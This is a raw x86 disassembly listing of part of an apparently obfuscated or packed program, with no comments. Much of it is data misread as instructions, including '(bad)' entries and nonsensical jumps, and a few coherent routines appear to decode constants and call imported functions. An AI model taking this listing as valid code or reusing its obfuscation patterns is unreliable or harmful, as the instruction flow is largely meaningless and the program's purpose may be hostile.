  40ea46:	out    0xb8,eax
  40ea48:	sbb    eax,0x16a178c5
  40ea4d:	ins    BYTE PTR es:[edi],dx
  40ea4e:	sub    ch,bh
  40ea50:	sub    BYTE PTR [edi],ah
  40ea52:	adc    dh,BYTE PTR [edx]
  40ea54:	add    ah,bl
  40ea56:	or     al,0xdf
  40ea58:	add    DWORD PTR [edx-0x2],edi
  40ea5b:	xchg   edx,eax
  40ea5c:	test   eax,0x9e69b9a3
  40ea61:	pusha  
  40ea62:	dec    eax
  40ea63:	in     eax,0xa7
  40ea65:	add    esp,DWORD PTR [ecx]
  40ea67:	pop    edi
  40ea68:	xchg   bh,ch
  40ea6a:	or     eax,0x2d774b4b
  40ea6f:	call   0x67458ea4
  40ea74:	dec    edi
  40ea75:	adc    BYTE PTR [ebx-0x3c],ah
  40ea78:	ret    0xb8dd
  40ea7b:	cdq    
  40ea7c:	push   0xdfb6dcea
  40ea81:	mov    eax,ds:0xd0bd7230
  40ea86:	sahf   
  40ea87:	stc    
  40ea88:	(bad)  
  40ea89:	out    0xc0,al
  40ea8b:	jbe    0x40ea9e
  40ea8d:	sub    eax,eax
  40ea8f:	mov    esp,0xaa2f5ffd
  40ea94:	les    eax,FWORD PTR ds:0xe9e8ffd6
  40ea9a:	(bad)  
  40ea9b:	jl     0x40eabd
  40ea9d:	mov    bh,0x78
  40ea9f:	icebp  
  40eaa0:	pop    esp
  40eaa1:	cmp    DWORD PTR [eax],ecx
  40eaa3:	push   esp
  40eaa4:	cmp    bl,0xa
  40eaa7:	or     esi,DWORD PTR [edx-0x55]
  40eaaa:	retf   0x856a
  40eaad:	mov    ebx,0x75e30f55
  40eab2:	or     edi,DWORD PTR [eax+0x35500673]
  40eab8:	iret   
  40eab9:	inc    esi
  40eaba:	pop    esi
  40eabb:	mov    cl,dl
  40eabd:	dec    edx
  40eabe:	mov    al,0xbc
  40eac0:	das    
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ah,BYTE PTR [edx-0x65dc9ad1]
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec37
  40ebc0:	inc    esi
  40ebc1:	inc    ebp
  40ebc2:	imul   edx,edx,0xc
  40ebc5:	loope  0x40eb93
  40ebc7:	cdq    
  40ebc8:	inc    esp
  40ebc9:	or     eax,0xe0393107
  40ebce:	sub    ch,BYTE PTR [eax-0x32324f4d]
  40ebd4:	jbe    0x40eb89
  40ebd6:	shl    BYTE PTR [edi+0xc],cl
  40ebd9:	xchg   BYTE PTR [edi-0x60],bl
  40ebdc:	jb     0x40ebed
  40ebde:	ja     0x40ec4a
  40ebe0:	repnz inc ecx
  40ebe2:	mov    ds:0x3b992dd2,al
  40ebe7:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40ebe9:	aaa    
  40ebea:	repnz mov edx,0x89412069
  40ebf0:	outs   dx,BYTE PTR ds:[esi]
  40ebf1:	ins    BYTE PTR es:[edi],dx
  40ebf2:	push   ebp
  40ebf3:	mov    BYTE PTR [ecx-0x5dbd0491],al
  40ebf9:	mov    eax,0x4106888e
  40ebfe:	dec    ebx
  40ebff:	dec    ebx
  40ec00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec02:	rol    BYTE PTR [ebx+0x3bfa9ea0],1
  40ec08:	push   cs
  40ec09:	pusha  
  40ec0a:	ftst   
  40ec0c:	push   ds
  40ec0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec0e:	dec    ebx
  40ec0f:	jb     0x40ebd7
  40ec11:	repnz xchg ebp,eax
  40ec13:	mov    al,bh
  40ec15:	pop    ebp
  40ec16:	test   ebp,edi
  40ec18:	xchg   edi,eax
  40ec19:	inc    esp
  40ec1a:	and    ah,BYTE PTR [eax+0x3f0b698a]
  40ec20:	test   eax,0x162156c4
  40ec25:	add    DWORD PTR [ebp-0x72],0xffffffaf
  40ec29:	ret    
  40ec2a:	imul   edx,eax,0xf
  40ec2d:	rcl    BYTE PTR [edi+esi*1],0x54
  40ec31:	inc    esp
  40ec32:	mov    bl,0xc
  40ec34:	or     ecx,eax
  40ec36:	jb     0x40eca4
  40ec38:	mov    esi,0xe27afb0
  40ec3d:	mov    ebx,0x2c195fdf
  40ec42:	daa    
  40ec43:	sub    bl,BYTE PTR [eax+0x2c532411]
  40ec49:	mov    edx,DWORD PTR [ebx-0x7a]
  40ec4c:	mov    bl,0x6b
  40ec4e:	test   DWORD PTR [ebp+0x48],ebx
  40ec51:	mov    ebp,0xea5f68de
  40ec56:	icebp  
  40ec57:	pop    ebx
  40ec58:	push   cs
  40ec59:	mov    edx,0xa4873968
  40ec5e:	ins    DWORD PTR es:[edi],dx
  40ec5f:	and    DWORD PTR [esi+0x56c9c1fe],edx
  40ec65:	dec    cx
  40ec67:	adc    eax,0x7bdaff35
  40ec6c:	clc    
  40ec6d:	add    BYTE PTR fs:[edx],ch
  40ec70:	sub    bl,BYTE PTR [ebp-0x4f24f833]
  40ec76:	mov    edx,DWORD PTR [ebp+ecx*1+0x59]
  40ec7a:	fmulp  st(1),st
  40ec7c:	cmp    eax,0x2d662405
  40ec81:	mov    ds:0x565fcb30,eax
  40ec86:	imul   BYTE PTR [eax-0x3d766ade]
  40ec8c:	(bad)  
  40ec8e:	jbe    0x40ecd7
  40ec90:	pusha  
  40ec91:	jae    0x40ecd3
  40ec93:	cmp    al,0xfe
  40ec95:	test   eax,0x8de526d9
  40ec9a:	dec    esi
  40ec9b:	push   es
  40ec9c:	pop    ecx
  40ec9d:	push   ds
  40ec9e:	jp     0x40ec9b
  40eca0:	push   0xf730230d
  40eca5:	out    dx,eax
  40eca6:	sub    al,0x6d
  40eca8:	ja     0x40ed29
  40ecaa:	xchg   ebx,eax
  40ecab:	push   cs
  40ecac:	xchg   BYTE PTR [eax+0x60],al
  40ecaf:	xor    al,0x79
  40ecb1:	fdivr  DWORD PTR [ecx]
  40ecb3:	pop    esp
  40ecb4:	loopne 0x40ecee
  40ecb6:	fimul  DWORD PTR [ebx-0x13]
  40ecb9:	imul   edx,DWORD PTR [edi+0x33],0x7a
  40ecbd:	pop    es
  40ecbe:	pop    ss
  40ecbf:	jle    0x40ed2c
  40ecc1:	test   BYTE PTR [edi+ecx*8+0x103997ad],al
  40ecc8:	(bad)  
  40ecc9:	shr    DWORD PTR gs:0x997b9893,cl
  40ecd0:	cmc    
  40ecd1:	and    ebp,esi
  40ecd3:	mov    dl,al
  40ecd5:	mov    BYTE PTR [ecx-0x2b141d75],bh
  40ecdb:	int    0x46
  40ecdd:	(bad)  
  40ecde:	lods   al,BYTE PTR ds:[esi]
  40ecdf:	sub    al,BYTE PTR [edi+0x7fb2b90]
  40ece5:	adc    eax,0x54e81a3
  40ecea:	in     eax,dx
  40eceb:	sbb    DWORD PTR [edi],esp
  40eced:	pop    edi
  40ecee:	and    eax,0x74b24c76
  40ecf3:	neg    al
  40ecf5:	mov    ch,0xb6
  40ecf7:	adc    BYTE PTR [ebp+0x183c4189],ah
  40ecfd:	retf   
  40ecfe:	stos   DWORD PTR es:[edi],eax
  40ecff:	scas   eax,DWORD PTR es:[edi]
  40ed00:	lahf   
  40ed01:	(bad)  
  40ed03:	jp     0x40ecc1
  40ed05:	or     eax,0xeca8b84e
  40ed0a:	inc    esi
  40ed0b:	xchg   DWORD PTR [eax-0x6b],ecx
  40ed0e:	or     dl,ah
  40ed10:	fst    QWORD PTR [ebp+0x4]
  40ed13:	icebp  
  40ed14:	lahf   
  40ed15:	xchg   ebx,eax
  40ed16:	ret    
  40ed17:	out    dx,eax
  40ed18:	dec    ebp
  40ed19:	xor    bl,BYTE PTR ds:0xad4dc943
  40ed1f:	push   cs
  40ed20:	int3   
  40ed21:	stos   BYTE PTR es:[edi],al
  40ed22:	imul   ah
  40ed24:	push   es
  40ed25:	xchg   esi,eax
  40ed26:	push   0xffffffd1
  40ed28:	repnz push ss
  40ed2a:	das    
  40ed2b:	gs push ecx
  40ed2d:	sbb    DWORD PTR [eax+ebx*4+0x538e57da],0x18
  40ed35:	ror    DWORD PTR [edx],0x41
  40ed38:	xchg   cl,cl
  40ed3a:	(bad)  
  40ed3b:	push   ss
  40ed3c:	and    esp,esp
  40ed3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed3f:	adc    eax,0x1876fa20
  40ed44:	or     BYTE PTR [edx-0x1f],bl
  40ed47:	cli    
  40ed48:	pop    ebx
  40ed49:	retf   0xf13f
  40ed4c:	push   esi
  40ed4d:	xor    ch,dl
  40ed4f:	jo     0x40ed6b
  40ed51:	jnp    0x40edcc
  40ed53:	inc    ebx
  40ed54:	cmp    ecx,ecx
  40ed56:	cwde   
  40ed57:	jl     0x40ed0c
  40ed59:	jno    0x40ed53
  40ed5b:	mov    ecx,0xe8c2bc5b
  40ed60:	mov    edx,0x729c43c3
  40ed65:	popf   
  40ed66:	cld    
  40ed67:	and    BYTE PTR [ebx+0x5],dh
  40ed6a:	cmc    
  40ed6b:	mov    edx,0xe1c25f37
  40ed70:	mov    BYTE PTR [ebx],0x8b
  40ed73:	xchg   edi,eax
  40ed74:	fdivrp st(3),st
  40ed76:	jmp    0x40eded
  40ed78:	gs call 0x4a4a3a67
  40ed7e:	mov    edi,0x8bbfb7b6
  40ed83:	retf   0xebb6
  40ed86:	dec    esp
  40ed87:	push   esi
  40ed88:	xchg   edx,eax
  40ed89:	sub    edx,DWORD PTR [edi+0x7d7e9444]
  40ed8f:	pop    es
  40ed90:	scas   eax,DWORD PTR es:[edi]
  40ed91:	mov    dl,BYTE PTR [edx+ecx*1-0x71]
  40ed95:	push   0xffffffc7
  40ed97:	cwde   
  40ed98:	add    al,0x33
  40ed9a:	ret    0xd2b
  40ed9d:	push   ebx
  40ed9e:	aaa    
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x4337d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4337d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4337d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4337d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4337d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x306c5283]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	xor    DWORD PTR [edx*4-0x4b04355f],ebp
  40ee7d:	xchg   edi,eax
  40ee7e:	xchg   ecx,eax
  40ee7f:	sub    eax,DWORD PTR [eax+0x1e]
  40ee82:	xchg   ecx,eax
  40ee83:	mov    ebx,0x778e05f8
  40ee88:	ins    DWORD PTR es:[edi],dx
  40ee89:	ja     0x40ee5b
  40ee8b:	(bad)  
  40ee8c:	fisttp QWORD PTR [ebx+0x15]
  40ee8f:	in     eax,0x2a
  40ee91:	rcr    DWORD PTR [ecx-0x4c],0x40
  40ee95:	div    DWORD PTR [bp+0x4c]
  40ee99:	push   ebx
  40ee9a:	test   BYTE PTR [ecx],bl
  40ee9c:	and    bl,BYTE PTR [ebx]
  40ee9e:	popa   
  40ee9f:	add    al,0xa8
  40eea1:	sub    dl,BYTE PTR [esi+ecx*2+0x7ee6fadd]
  40eea8:	ror    cl,1
  40eeaa:	mov    ebp,0xa0fc3a5e
  40eeaf:	jmp    0xa81430ed
  40eeb4:	pop    ebx
  40eeb5:	jbe    0x40ee45
  40eeb7:	inc    esp
  40eeb8:	stos   DWORD PTR es:[edi],eax
  40eeb9:	sub    edi,DWORD PTR [eax]
  40eebb:	adc    ah,BYTE PTR [esi+0x6d]
  40eebe:	fwait
  40eebf:	(bad)  
  40eec1:	or     eax,DWORD PTR [ebp+0x31]
  40eec4:	int3   
  40eec5:	mov    DWORD PTR [eax-0x62],ebx
  40eec8:	jge    0x40ef0e
  40eeca:	(bad)  
  40eecb:	cmp    ecx,ebp
  40eecd:	sbb    BYTE PTR [edi],cl
  40eecf:	icebp  
  40eed0:	dec    esi
  40eed1:	in     eax,0x2
  40eed3:	xor    ecx,edx
  40eed5:	not    BYTE PTR [ebp-0x16]
  40eed8:	fisubr WORD PTR [edx+0x7b]
  40eedb:	aam    0xad
  40eedd:	and    DWORD PTR [edx-0xb41656f],edi
  40eee3:	je     0x40ee87
  40eee5:	int3   
  40eee6:	shl    BYTE PTR [ebx+ebp*1],cl
  40eee9:	xor    esp,DWORD PTR [ebx+eax*1]
  40eeec:	scas   eax,DWORD PTR es:[edi]
  40eeed:	in     eax,dx
  40eeee:	test   DWORD PTR [edx+ebx*2+0x78],eax
  40eef2:	sub    al,0x7a
  40eef4:	sbb    eax,0x43565476
  40eef9:	add    DWORD PTR [edx+0x3c],edi
  40eefc:	mov    BYTE PTR [ebx+0x53cd79cb],0x27
  40ef03:	outs   dx,BYTE PTR ds:[esi]
  40ef04:	push   ecx
  40ef05:	add    bl,BYTE PTR [esp+esi*1-0x80]
  40ef09:	pop    ds
  40ef0a:	out    0x40,al
  40ef0c:	add    al,0x98
  40ef0e:	dec    ebx
  40ef0f:	xchg   BYTE PTR [ebp+0xc],dl
  40ef12:	mov    edi,0x872c9857
  40ef17:	cli    
  40ef18:	push   ebp
  40ef19:	or     ch,BYTE PTR [ecx+0x35]
  40ef1c:	outs   dx,DWORD PTR ds:[esi]
  40ef1d:	repnz cmp al,0x9e
  40ef21:	in     al,dx
  40ef22:	jle    0x40eee4
  40ef24:	scas   al,BYTE PTR es:[edi]
  40ef25:	mov    ds,edx
  40ef27:	inc    eax
  40ef28:	rol    DWORD PTR [eax+edi*2+0x6e],cl
  40ef2c:	jl     0x40ef71
  40ef2e:	sbb    eax,0x4e00c364
  40ef33:	loope  0x40eecc
  40ef35:	int    0x8c
  40ef37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef38:	push   ds
  40ef39:	mov    es,eax
  40ef3b:	stos   BYTE PTR es:[edi],al
  40ef3c:	test   BYTE PTR [edx+ebp*1-0x80],bl
  40ef40:	mov    edi,0x739d3c51
  40ef45:	sbb    al,0x54
  40ef47:	leave  
  40ef48:	cmp    eax,0x1cf4a4cb
  40ef4d:	neg    BYTE PTR [ecx]
  40ef4f:	jnp    0x40eeeb
  40ef51:	pushf  
  40ef52:	popa   
  40ef53:	cdq    
  40ef54:	cli    
  40ef55:	cs or  dl,0x44
  40ef59:	mul    BYTE PTR [edi]
  40ef5b:	and    esi,ebx
  40ef5d:	xor    esp,DWORD PTR [ecx]
  40ef5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef60:	imul   ebp,DWORD PTR [ecx],0xffffffbd
  40ef63:	dec    esi
  40ef64:	jns    0x40efb1
  40ef66:	pop    ecx
  40ef67:	cld    
  40ef68:	(bad)  
  40ef69:	(bad)  
  40ef6a:	je     0x40ef7a
  40ef6c:	ror    BYTE PTR fs:[edi-0x5d],0x11
  40ef71:	xchg   esi,eax
  40ef72:	arpl   WORD PTR [ebx],bx
  40ef74:	loop   0x40ef09
  40ef76:	fmul   DWORD PTR [esp+edi*4-0x7a]
  40ef7a:	(bad)  
  40ef7c:	cmp    DWORD PTR [edi],0x1b99d3c9
  40ef82:	outs   dx,DWORD PTR ds:[esi]
  40ef83:	or     bh,bh
  40ef85:	adc    DWORD PTR [edi+0x6],esp
  40ef88:	cmp    BYTE PTR [edx-0x43],al
  40ef8b:	loopne 0x40ef56
  40ef8d:	mov    bh,0xa
  40ef8f:	xor    DWORD PTR [esi+0x3f],0xffffff98
  40ef93:	and    dh,dh
  40ef95:	leave  
  40ef96:	out    0xb9,eax
  40ef98:	mov    edx,0x34eb6ed7
  40ef9d:	push   esp
  40ef9e:	xchg   esi,eax
  40ef9f:	sbb    DWORD PTR [ebp+0x7a],edi
  40efa2:	xchg   ecx,eax
  40efa3:	inc    edi
  40efa4:	push   ss
  40efa5:	leave  
  40efa6:	div    BYTE PTR [ecx+0x4e]
  40efa9:	je     0x40ef9a
  40efab:	in     eax,dx
  40efac:	popa   
  40efad:	adc    eax,0x80f9641f
  40efb2:	call   0x1eb3021e
  40efb7:	shr    BYTE PTR [ebp+0x7ed5b6a4],cl
  40efbd:	sbb    BYTE PTR [ebx+0x22053cc1],0x7c
  40efc4:	cwde   
  40efc5:	jb     0x40f045
  40efc7:	xor    ebx,0x9aee1e72
  40efcd:	and    eax,0xcd6d2f75
  40efd2:	je     0x40eff1
  40efd4:	pushf  
  40efd5:	or     cl,BYTE PTR [ebp+0x68e40f4e]
  40efdb:	inc    esp
  40efdc:	shl    DWORD PTR [ecx-0x45b8b1a0],1
  40efe2:	stos   BYTE PTR es:[edi],al
  40efe3:	scas   eax,DWORD PTR es:[edi]
  40efe4:	jmp    0x841e1d11
  40efe9:	fs fwait
  40efeb:	mov    edx,DWORD PTR [edx-0x13b883e]
  40eff1:	xchg   edx,eax
  40eff2:	nop
  40eff3:	ins    DWORD PTR es:[edi],dx
  40eff4:	adc    ah,BYTE PTR [eax-0xe]
  40eff7:	push   ebx
  40eff8:	inc    esp
  40eff9:	push   ds
  40effa:	cld    
  40effb:	xor    eax,0x1a2783bd
  40f000:	imul   ebx,DWORD PTR [esi-0x6b],0xe4ec73d5
  40f007:	test   ch,al
  40f009:	retf   0xfddf
  40f00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f00d:	dec    ebx
  40f00e:	(bad)  
  40f010:	sbb    BYTE PTR [ebx],al
  40f012:	sti    
  40f013:	or     eax,0x4a4f92bc
  40f018:	jno    0x40efb4
  40f01a:	push   ebp
  40f01b:	inc    esi
  40f01c:	inc    esi
  40f01d:	xchg   esp,eax
  40f01e:	mov    BYTE PTR [ebp-0x72],dl
  40f021:	(bad)  
  40f022:	push   esi
  40f023:	inc    DWORD PTR [esi+0x6626576d]
  40f029:	sti    
  40f02a:	dec    esp
  40f02b:	push   es
  40f02c:	mov    ch,0x16
  40f02e:	push   0x97d4f524
  40f033:	mov    ah,0x59
  40f035:	popa   
  40f036:	repnz hlt 
  40f038:	push   ebx
  40f039:	and    edx,edx
  40f03b:	jo     0x40f09d
  40f03d:	and    ebp,DWORD PTR [esi+0x1c69bc15]
  40f043:	push   DWORD PTR [edi]
  40f045:	sub    BYTE PTR [ebx-0x5ca13a56],ah
  40f04b:	mov    eax,ds:0x85c13d82
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43379b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xbace1594,ebx
  40f076:	int    0x88
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	add    eax,0xbe3884f6
  40f085:	ss jb  0x40f068
  40f088:	hlt    
  40f089:	xchg   esi,eax
  40f08a:	loopne 0x40f09b
  40f08c:	mov    ecx,0x1084eb92
  40f091:	out    0xf3,eax
  40f093:	push   esi
  40f094:	jns    0x40f071
  40f096:	push   ecx
  40f097:	mov    edi,0xa7925b56
  40f09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f09d:	jg     0x40f0da
  40f09f:	cli    
  40f0a0:	stos   DWORD PTR es:[edi],eax
  40f0a1:	out    dx,ax
  40f0a3:	ds xchg ebx,eax
  40f0a5:	or     esp,esp
  40f0a7:	sbb    DWORD PTR [edx],esi
  40f0a9:	stc    
  40f0aa:	or     DWORD PTR [ecx+0x39],ebp
  40f0ad:	push   ss
  40f0ae:	stc    
  40f0af:	mov    ebp,0x28e10d45
  40f0b4:	inc    edx
  40f0b5:	cmp    dh,BYTE PTR [ecx+ebp*1]
  40f0b8:	(bad)  [edi]
  40f0ba:	outs   dx,BYTE PTR ds:[esi]
  40f0bb:	addr16 sub eax,0x50378f3d
  40f0c1:	push   ds
  40f0c2:	and    al,0x7
  40f0c4:	push   ds
  40f0c5:	call   0xb3d6:0x27204461
  40f0cc:	lods   eax,DWORD PTR ds:[esi]
  40f0cd:	sub    dl,BYTE PTR ss:[edi+0x173d5795]
  40f0d4:	push   es
  40f0d5:	push   es
  40f0d6:	or     BYTE PTR [edx+edi*1+0x19],dl
  40f0da:	iret   
  40f0db:	mov    ds:0xe6cba59e,al
  40f0e0:	nop
  40f0e1:	pop    ebx
  40f0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0e3:	out    dx,eax
  40f0e4:	mov    esi,0x714c8770
  40f0e9:	pop    ebp
  40f0ea:	sbb    eax,ebp
  40f0ec:	(bad)  
  40f0ed:	addr16 mov bh,0x5d
  40f0f0:	dec    edi
  40f0f1:	sbb    al,0x76
  40f0f3:	dec    esi
  40f0f4:	addr16 sub dl,al
  40f0f7:	push   ebp
  40f0f8:	cld    
  40f0f9:	retf   0x9ca4
  40f0fc:	addr16 sbb eax,0xb0c579d3
  40f102:	mov    dl,0xe4
  40f104:	ret    0xc259
  40f107:	xor    eax,0xb4dddb4c
  40f10c:	addr16 icebp 
  40f10e:	mov    dh,0xa7
  40f110:	retf   0xe58f
  40f113:	or     DWORD PTR [esi+0x48],0xffffffc6
  40f117:	push   cs
  40f118:	loope  0x40f0c5
  40f11a:	add    BYTE PTR [edi-0x4ed3edf0],al
  40f120:	mov    ?,edx
  40f122:	mov    DWORD PTR [eax+ecx*4],ebx
  40f125:	imul   esi,eax,0xff9d7ef1
  40f12b:	mov    esi,0x4982345c
  40f130:	mov    ds:0xc0d53604,al
  40f135:	mov    cl,0xe5
  40f137:	es rdseed esp
  40f13b:	xchg   esp,eax
  40f13c:	jae    0x40f15b
  40f13e:	and    ecx,edx
  40f140:	(bad)  
  40f141:	fstp   DWORD PTR [ecx-0x16d4231]
  40f147:	in     al,dx
  40f148:	bound  edi,QWORD PTR [edi-0x1]
  40f14b:	inc    edi
  40f14c:	push   ebp
  40f14d:	inc    edx
  40f14e:	mov    eax,ds:0xa5d7da86
  40f153:	sbb    edx,eax
  40f155:	mov    edx,0xe9509f37
  40f15a:	add    esi,ebp
  40f15c:	imul   DWORD PTR [ebx-0x80]
  40f15f:	push   cs
  40f160:	sbb    al,0xa8
  40f162:	fcom   DWORD PTR [ebx-0x60b50136]
  40f168:	mov    BYTE PTR [ebx+0x75],ch
  40f16b:	es loope 0x40f1de
  40f16e:	xchg   esi,eax
  40f16f:	out    0x2f,eax
  40f171:	inc    eax
  40f172:	mov    dl,0x62
  40f174:	test   DWORD PTR [edx-0x20],edi
  40f177:	hlt    
  40f178:	lock and cl,BYTE PTR [ebx-0x1a]
  40f17c:	fnstsw WORD PTR [ebx+0x208f0920]
  40f182:	push   eax
  40f183:	push   esi
  40f184:	pushf  
  40f185:	jecxz  0x40f1d3
  40f187:	dec    esi
  40f188:	adc    ah,0xd1
  40f18b:	xor    al,0x4c
  40f18d:	(bad)  
  40f18f:	add    DWORD PTR [ecx+0x53481053],eax
  40f195:	jmp    0xff4b9a87
  40f19a:	das    
  40f19b:	push   0xd7b69661
  40f1a0:	mov    bl,0x18
  40f1a2:	jnp    0x40f220
  40f1a4:	pop    ss
  40f1a5:	mov    esp,0xdf0caf93
  40f1aa:	popa   
  40f1ab:	inc    esi
  40f1ac:	mov    bl,0xe4
  40f1ae:	sub    ecx,ebx
  40f1b0:	dec    esi
  40f1b1:	inc    ebx
  40f1b2:	jecxz  0x40f167
  40f1b4:	push   ecx
  40f1b5:	cmc    
  40f1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b7:	xor    al,0x23
  40f1b9:	mov    esp,0x2975f79f
  40f1be:	cli    
  40f1bf:	add    esp,DWORD PTR [esp]
  40f1c2:	jnp    0x40f181
  40f1c4:	gs je  0x40f18f
  40f1c7:	imul   edx,esi,0x9975ef5e
  40f1cd:	sbb    bl,BYTE PTR [edx+edx*8+0x79]
  40f1d1:	pop    edx
  40f1d2:	xchg   BYTE PTR [ebp+0x3172b08a],al
  40f1d8:	pop    ebx
  40f1d9:	(bad)  
  40f1da:	fucom  st(5)
  40f1dc:	mov    al,cl
  40f1de:	out    dx,al
  40f1df:	inc    ebp
  40f1e0:	or     BYTE PTR [eax-0x730947cd],dh
  40f1e6:	or     BYTE PTR [esi],dh
  40f1e8:	jmp    0xb9fb:0xd5bfdb9a
  40f1ef:	bnd jns 0x40f215
  40f1f2:	xor    ecx,edx
  40f1f4:	int3   
  40f1f5:	dec    ebx
  40f1f6:	pop    esi
  40f1f7:	mov    ?,WORD PTR [edi-0x57]
  40f1fa:	enter  0xd1e1,0x20
  40f1fe:	jge    0x40f1e5
  40f200:	dec    edx
  40f201:	sahf   
  40f202:	adc    eax,0x1a14b0cd
  40f207:	repnz and eax,0xebb7e16e
  40f20d:	sub    eax,0x5e164adb
  40f212:	(bad)  
  40f213:	out    0xd2,eax
  40f215:	int3   
  40f216:	fcomp  DWORD PTR [eax]
  40f218:	fist   DWORD PTR [edi]
  40f21a:	js     0x40f229
